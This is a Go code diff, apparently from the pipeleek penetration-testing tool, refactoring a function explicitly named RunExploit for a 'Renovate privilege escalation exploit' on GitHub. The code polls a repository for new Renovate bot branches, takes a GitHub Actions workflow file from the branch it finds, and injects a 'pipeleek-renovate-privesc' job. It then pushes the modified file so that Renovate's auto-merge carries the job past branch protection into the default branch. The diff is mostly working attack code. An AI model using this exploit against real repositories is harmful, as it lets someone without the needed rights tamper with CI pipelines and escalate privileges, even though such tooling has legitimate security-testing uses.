@@ -12,50 +12,63 @@ import (
 	"gopkg.in/yaml.v3"
 )
 
-// RunExploit performs the Renovate privilege escalation exploit on GitHub.
-func RunExploit(client *github.Client, repoName, renovateBranchesRegex string) {
-	ctx := context.Background()
+type repoRef struct {
+	owner string
+	repo  string
+}
 
-	log.Info().Msg("Ensure the Renovate bot has greater write access than you, otherwise this will not work, and is able to auto merge into the protected main branch")
-
+func newRepoRef(repoName string) *repoRef {
 	parts := strings.Split(repoName, "/")
 	if len(parts) != 2 {
 		log.Fatal().Str("repoName", repoName).Msg("Repository name must be in format owner/repo")
 	}
-	owner, repo := parts[0], parts[1]
+	return &repoRef{owner: parts[0], repo: parts[1]}
+}
 
-	repository, _, err := client.Repositories.Get(ctx, owner, repo)
+// RunExploit performs the Renovate privilege escalation exploit on GitHub.
+func RunExploit(client *github.Client, repoName, renovateBranchesRegex, monitoringIntervalStr string) {
+	ctx := context.Background()
+
+	log.Info().Msg("Ensure the Renovate bot has greater write access than you, otherwise this will not work, and is able to auto merge into the protected main branch")
+
+	ref := newRepoRef(repoName)
+	repository, _, err := client.Repositories.Get(ctx, ref.owner, ref.repo)
 	if err != nil {
 		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve repository information")
 	}
 
-	// Create branch monitor
 	branchMonitor, err := pkgrenovate.NewBranchMonitor(renovateBranchesRegex)
 	if err != nil {
 		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex is invalid")
 	}
 
-	// Check if GitHub Actions are enabled
+	monitoringInterval, err := time.ParseDuration(monitoringIntervalStr)
+	if err != nil {
+		log.Fatal().Stack().Err(err).Str("interval", monitoringIntervalStr).Msg("Failed to parse monitoring-interval duration")
+	}
+
 	if repository.GetDisabled() || repository.GetArchived() {
 		log.Fatal().Msg("Repository is disabled or archived, GitHub Actions cannot run")
 	}
 
-	// Fetch workflow files to verify they exist
-	workflowYml := fetchWorkflowFiles(ctx, client, owner, repo)
-	if workflowYml == "" {
+	workflowPaths := fetchWorkflowFiles(ctx, client, ref.owner, ref.repo)
+	if len(workflowPaths) == 0 {
 		log.Fatal().Msg("No GitHub Actions workflows found, auto merging is impossible")
 	}
 
-	checkDefaultBranchProtections(ctx, client, repository)
+	checkDefaultBranchProtections(ctx, client, ref, repository)
+	branch := monitorBranches(ctx, client, ref, branchMonitor, monitoringInterval)
 
-	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
-	branch := monitorBranches(ctx, client, repository, branchMonitor)
+	log.Debug().Str("branch", branch.GetName()).Msg("Fetching workflow from Renovate branch")
+	workflowContent := getWorkflowYAML(ctx, client, ref, branch.GetName(), workflowPaths[0])
 
-	log.Info().Str("branch", branch.GetName()).Msg("Fetching workflow from Renovate branch")
-	workflowContent := getBranchWorkflow(ctx, client, repository, branch)
+	log.Debug().Str("branch", branch.GetName()).Msg("Modifying workflow configuration")
+	if workflowContent["jobs"] == nil {
+		workflowContent["jobs"] = make(map[string]interface{})
+	}
 
-	log.Info().Str("branch", branch.GetName()).Msg("Modifying workflow configuration")
-	workflowContent["pipeleek-renovate-privesc"] = map[string]interface{}{
+	jobs := workflowContent["jobs"].(map[string]interface{})
+	jobs["pipeleek-renovate-privesc"] = map[string]interface{}{
 		"runs-on": "ubuntu-latest",
 		"steps": []map[string]interface{}{
 			{
@@ -65,19 +78,14 @@ func RunExploit(client *github.Client, repoName, renovateBranchesRegex string) {
 		},
 	}
 
-	updateWorkflowYml(ctx, client, repository, branch, workflowContent)
-
-	// Log shared exploit instructions
+	updateWorkflowYAML(ctx, client, ref, branch.GetName(), workflowPaths[0], workflowContent)
 	pkgrenovate.LogExploitInstructions(branch.GetName(), repository.GetDefaultBranch())
-	listBranchPRs(ctx, client, repository, branch)
+	listBranchPRs(ctx, client, ref, branch, repository.GetDefaultBranch())
 }
 
-func checkDefaultBranchProtections(ctx context.Context, client *github.Client, repo *github.Repository) {
-	owner := repo.GetOwner().GetLogin()
-	repoName := repo.GetName()
+func checkDefaultBranchProtections(ctx context.Context, client *github.Client, ref *repoRef, repo *github.Repository) {
 	defaultBranch := repo.GetDefaultBranch()
-
-	protection, resp, err := client.Repositories.GetBranchProtection(ctx, owner, repoName, defaultBranch)
+	protection, resp, err := client.Repositories.GetBranchProtection(ctx, ref.owner, ref.repo, defaultBranch)
 	if err != nil {
 		if resp != nil && resp.StatusCode == 404 {
 			log.Warn().Str("branch", defaultBranch).Msg("Default branch is not protected, you might have direct push access")
@@ -94,19 +102,14 @@ func checkDefaultBranchProtections(ctx context.Context, client *github.Client, r
 	}
 }
 
-func monitorBranches(ctx context.Context, client *github.Client, repo *github.Repository, branchMonitor *pkgrenovate.BranchMonitor) *github.Branch {
-	owner := repo.GetOwner().GetLogin()
-	repoName := repo.GetName()
-
+func monitorBranches(ctx context.Context, client *github.Client, ref *repoRef, branchMonitor *pkgrenovate.BranchMonitor, monitoringInterval time.Duration) *github.Branch {
+	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
 	isFirstScan := true
 
 	for {
 		log.Debug().Msg("Checking for new branches created by Renovate Bot")
-
-		branches, _, err := client.Repositories.ListBranches(ctx, owner, repoName, &github.BranchListOptions{
-			ListOptions: github.ListOptions{
-				PerPage: 100,
-			},
+		branches, _, err := client.Repositories.ListBranches(ctx, ref.owner, ref.repo, &github.BranchListOptions{
+			ListOptions: github.ListOptions{PerPage: 100},
 		})
 
 		if err != nil {
@@ -124,144 +127,62 @@ func monitorBranches(ctx context.Context, client *github.Client, repo *github.Re
 
 		for _, branch := range branches {
 			if branchMonitor.CheckBranch(branch.GetName(), isFirstScan) {
-				log.Info().Str("branch", branch.GetName()).Msg("Starting exploit process")
 				return branch
 			}
 		}
 
 		isFirstScan = false
-		time.Sleep(pkgrenovate.GetMonitoringInterval())
+		time.Sleep(monitoringInterval)
 	}
 }
 
-func fetchWorkflowFiles(ctx context.Context, client *github.Client, owner, repo string) string {
+func fetchWorkflowFiles(ctx context.Context, client *github.Client, owner, repo string) []string {
 	_, dirContents, _, err := client.Repositories.GetContents(ctx, owner, repo, ".github/workflows", nil)
 	if err != nil {
-		return ""
+		return nil
 	}
 
-	var allWorkflows strings.Builder
+	var workflowPaths []string
 	for _, content := range dirContents {
 		if content.GetType() == "file" && (strings.HasSuffix(content.GetName(), ".yml") || strings.HasSuffix(content.GetName(), ".yaml")) {
-			fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repo, content.GetPath(), nil)
-			if err != nil {
-				continue
-			}
-
-			if fileContent != nil {
-				contentStr, err := fileContent.GetContent()
-				if err != nil {
-					log.Debug().Err(err).Str("file", content.GetPath()).Msg("Failed to get workflow file content")
-					continue
-				}
-				if contentStr != "" {
-					allWorkflows.WriteString(contentStr)
-					allWorkflows.WriteString("\n")
-				}
-			}
+			workflowPaths = append(workflowPaths, content.GetPath())
 		}
 	}
 
-	return allWorkflows.String()
+	return workflowPaths
 }
 
-func getBranchWorkflow(ctx context.Context, client *github.Client, repo *github.Repository, branch *github.Branch) map[string]interface{} {
-	owner := repo.GetOwner().GetLogin()
-	repoName := repo.GetName()
-	branchName := branch.GetName()
-
-	log.Info().Str("branch", branchName).Msg("Fetching workflow files from Renovate branch")
-
-	// Try to find the main workflow file
-	workflowPaths := []string{
-		".github/workflows/renovate.yml",
-		".github/workflows/renovate.yaml",
-		".github/workflows/main.yml",
-		".github/workflows/main.yaml",
-		".github/workflows/ci.yml",
-		".github/workflows/ci.yaml",
+func getWorkflowYAML(ctx context.Context, client *github.Client, ref *repoRef, branchName, workflowPath string) map[string]interface{} {
+	fileContent, _, _, err := client.Repositories.GetContents(ctx, ref.owner, ref.repo, workflowPath, &github.RepositoryContentGetOptions{
+		Ref: branchName,
+	})
+	if err != nil || fileContent == nil {
+		log.Fatal().Str("branch", branchName).Str("workflow", workflowPath).Err(err).Msg("Failed to retrieve workflow file")
 	}
 
-	var workflowContent string
-	var workflowPath string
-
-	// Try each workflow path
-	for _, path := range workflowPaths {
-		fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, path, &github.RepositoryContentGetOptions{
-			Ref: branchName,
-		})
-		if err == nil && fileContent != nil {
-			content, err := fileContent.GetContent()
-			if err == nil && content != "" {
-				workflowContent = content
-				workflowPath = path
-				break
-			}
-		}
-	}
-
-	// If no specific workflow found, try to list all workflows in the branch
-	if workflowContent == "" {
-		_, dirContents, _, err := client.Repositories.GetContents(ctx, owner, repoName, ".github/workflows", &github.RepositoryContentGetOptions{
-			Ref: branchName,
-		})
-		if err == nil && len(dirContents) > 0 {
-			// Use the first workflow file found
-			for _, content := range dirContents {
-				if content.GetType() == "file" {
-					fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, content.GetPath(), &github.RepositoryContentGetOptions{
-						Ref: branchName,
-					})
-					if err == nil && fileContent != nil {
-						wfContent, err := fileContent.GetContent()
-						if err == nil && wfContent != "" {
-							workflowContent = wfContent
-							workflowPath = content.GetPath()
-							break
-						}
-					}
-				}
-			}
-		}
-	}
-
-	if workflowContent == "" {
-		log.Fatal().Str("branch", branchName).Msg("Failed to retrieve any workflow file from Renovate branch")
+	content, err := fileContent.GetContent()
+	if err != nil || content == "" {
+		log.Fatal().Str("branch", branchName).Str("workflow", workflowPath).Err(err).Msg("Failed to get workflow file content")
 	}
 
 	var workflowConfig map[string]interface{}
-	err := yaml.Unmarshal([]byte(workflowContent), &workflowConfig)
+	err = yaml.Unmarshal([]byte(content), &workflowConfig)
 	if err != nil {
-		log.Fatal().Str("workflow", workflowPath).Err(err).Msg("Failed to unmarshal workflow configuration of the Renovate branch")
+		log.Fatal().Str("workflow", workflowPath).Err(err).Msg("Failed to unmarshal workflow configuration")
 	}
-
-	// Store the workflow path for later use
-	workflowConfig["_pipeleek_workflow_path"] = workflowPath
 
 	return workflowConfig
 }
 
-func updateWorkflowYml(ctx context.Context, client *github.Client, repo *github.Repository, branch *github.Branch, workflowConfig map[string]interface{}) {
-	owner := repo.GetOwner().GetLogin()
-	repoName := repo.GetName()
-	branchName := branch.GetName()
-
-	// Extract the workflow path we stored earlier
-	workflowPath, ok := workflowConfig["_pipeleek_workflow_path"].(string)
-	if !ok {
-		workflowPath = ".github/workflows/renovate.yml"
-	}
-	delete(workflowConfig, "_pipeleek_workflow_path")
-
-	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Modifying workflow file in Renovate branch")
+func updateWorkflowYAML(ctx context.Context, client *github.Client, ref *repoRef, branchName, workflowPath string, workflowConfig map[string]interface{}) {
+	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Modifying workflow file")
 
 	workflowYaml, err := yaml.Marshal(workflowConfig)
 	if err != nil {
-		log.Fatal().Stack().Err(err).Msg("Failed to marshal workflow configuration for the Renovate branch")
+		log.Fatal().Stack().Err(err).Msg("Failed to marshal workflow configuration")
 	}
 
-	// Get current file to get its SHA
-	fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, workflowPath, &github.RepositoryContentGetOptions{
+	fileContent, _, _, err := client.Repositories.GetContents(ctx, ref.owner, ref.repo, workflowPath, &github.RepositoryContentGetOptions{
 		Ref: branchName,
 	})
 	if err != nil {
@@ -275,25 +196,22 @@ func updateWorkflowYml(ctx context.Context, client *github.Client, repo *github.
 		SHA:     fileContent.SHA,
 	}
 
-	_, _, err = client.Repositories.UpdateFile(ctx, owner, repoName, workflowPath, opts)
+	_, _, err = client.Repositories.UpdateFile(ctx, ref.owner, ref.repo, workflowPath, opts)
 	if err != nil {
-		log.Fatal().Stack().Err(err).Str("branch", branchName).Msg("Failed to update workflow file in Renovate branch")
+		log.Fatal().Stack().Err(err).Str("branch", branchName).Msg("Failed to update workflow file")
 	}
 
-	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Updated remote workflow file in Renovate branch")
+	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Updated remote workflow file")
 }
 
-func listBranchPRs(ctx context.Context, client *github.Client, repo *github.Repository, branch *github.Branch) {
-	owner := repo.GetOwner().GetLogin()
-	repoName := repo.GetName()
+func listBranchPRs(ctx context.Context, client *github.Client, ref *repoRef, branch *github.Branch, defaultBranch string) {
 	branchName := branch.GetName()
-
 	opts := &github.PullRequestListOptions{
-		Head: fmt.Sprintf("%s:%s", owner, branchName),
-		Base: repo.GetDefaultBranch(),
+		Head: fmt.Sprintf("%s:%s", ref.owner, branchName),
+		Base: defaultBranch,
 	}
 
-	prs, _, err := client.PullRequests.List(ctx, owner, repoName, opts)
+	prs, _, err := client.PullRequests.List(ctx, ref.owner, ref.repo, opts)
 	if err != nil {
 		log.Error().Err(err).Msg("Failed to list pull requests for branch, go check manually")
 		return
